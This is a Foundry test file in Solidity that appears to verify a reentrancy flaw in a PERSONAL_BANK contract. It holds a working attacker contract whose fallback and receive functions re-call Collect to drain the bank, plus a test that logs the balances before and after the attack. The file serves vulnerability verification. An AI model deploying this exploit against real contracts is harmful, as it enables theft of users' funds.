// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol";

// Mock LogFile contract that implements required interface
contract MockLogFile {
    function AddMessage(address, uint, string memory) public {}
}

contract MaliciousContract {
    PERSONAL_BANK public bank;
    uint public attackCount;
    uint public attackAmount;

    constructor(address payable _bankAddress) {
        bank = PERSONAL_BANK(_bankAddress);
    }

    function deposit() external payable {
        bank.Deposit{value: msg.value}();
    }

    function attack(uint _amount) external {
        attackAmount = _amount;
        bank.Collect(_amount);
    }

    fallback() external payable {
        if (address(bank).balance >= attackAmount && attackCount < 5) {
            attackCount++;
            bank.Collect(attackAmount);
        }
    }

    receive() external payable {
        if (address(bank).balance >= attackAmount && attackCount < 5) {
            attackCount++;
            bank.Collect(attackAmount);
        }
    }
}

contract PersonalBankTest is Test {
    PERSONAL_BANK public bank;
    MaliciousContract public attacker;
    MockLogFile public mockLogFile;
    address public owner = address(0x1);

    function setUp() public {
        vm.startPrank(owner);
        // Deploy mock LogFile first
        mockLogFile = new MockLogFile();
        
        // Deploy and setup bank
        bank = new PERSONAL_BANK();
        bank.SetLogFile(address(mockLogFile));
        bank.SetMinSum(1 ether);
        vm.stopPrank();

        attacker = new MaliciousContract(payable(address(bank)));
    }

    function testReentrancyAttack() public {
        // Fund the attacker contract
        vm.deal(address(attacker), 10 ether);
        
        // Attacker deposits funds
        vm.prank(address(attacker));
        attacker.deposit{value: 5 ether}();

        // Capture state BEFORE attack
        console2.log("\n--- BEFORE-Trigger ---");
        uint bankBalanceBefore = address(bank).balance;
        uint attackerBalanceBefore = address(attacker).balance;
        uint attackCountBefore = attacker.attackCount();
        console2.log("- Bank balance (before):   %s", bankBalanceBefore);
        console2.log("- Attacker balance (before): %s", attackerBalanceBefore);
        console2.log("- Attack count (before):      %s\n", attackCountBefore);

        // Execute attack trigger
        console2.log("--- Trigger (attack) ---");
        vm.prank(address(attacker));
        attacker.attack(1 ether);
        console2.log("--- AFTER-Trigger ---");

        // Capture state AFTER attack
        uint bankBalanceAfter = address(bank).balance;
        uint attackerBalanceAfter = address(attacker).balance;
        uint attackCountAfter = attacker.attackCount();
        
        console2.log("- Bank balance (after):    %s", bankBalanceAfter);
        console2.log("- Attacker balance (after):  %s", attackerBalanceAfter);
        console2.log("- Attack count (after):       %s\n", attackCountAfter);

        // Perform differential validation
        bool bankDrained = bankBalanceAfter != bankBalanceBefore;
        bool fundsTransferred = attackerBalanceAfter != attackerBalanceBefore;
        bool multipleWithdrawals = attackCountAfter > 1;

        console2.log("--- Differential Results ---");
        console2.log("- Bank drained:          %s", bankDrained ? "YES" : "NO");
        console2.log("- Funds moved to attacker: %s", fundsTransferred ? "YES" : "NO");
        console2.log("- Multiple withdrawals:    %s\n", multipleWithdrawals ? "YES" : "NO");

        // Final vulnerability verdict
        bool vulnerabilityExists = bankDrained && fundsTransferred && multipleWithdrawals;
        if (vulnerabilityExists) {
            console2.log("Vulnerability Exists: Reentrancy attack successfully drained funds");
        } else {
            console2.log("Vulnerability not Exist: Reentrancy attack failed");
        }
    }
}